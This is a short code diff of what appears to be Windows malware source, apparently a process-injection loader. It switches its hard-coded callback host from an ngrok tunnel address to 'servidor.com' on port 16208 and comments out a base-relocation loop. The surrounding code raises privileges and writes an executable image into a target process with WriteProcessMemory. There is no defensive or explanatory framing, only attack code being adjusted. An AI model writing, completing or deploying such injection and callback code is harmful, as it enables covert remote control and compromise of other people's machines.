@@ -10,7 +10,7 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 #define DEFAULT_PORT 16208
-#define DEFAULT_IP "8.tcp.ngrok.io"
+#define DEFAULT_IP "servidor.com"
 
 DWORD ChangePrivileges() {
     HANDLE currentProcess = GetCurrentProcess();
@@ -172,6 +172,7 @@ int main(int argc, char *argv[])
     OldDelta = (DWORD_PTR)((LPBYTE)hModule - pINH->OptionalHeader.ImageBase);
     std::cout << std::hex << OldDelta;
 
+    /*
     // Browse all relocation blocks
     while (pIBR->VirtualAddress != 0)
     {
@@ -206,7 +207,8 @@ int main(int argc, char *argv[])
 
         pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
     }
-
+*/
+    
     std::cout << "Writing executable image into target process...\n";
     
     if (!WriteProcessMemory(hProcess, mem, image, pINH->OptionalHeader.SizeOfImage, NULL))
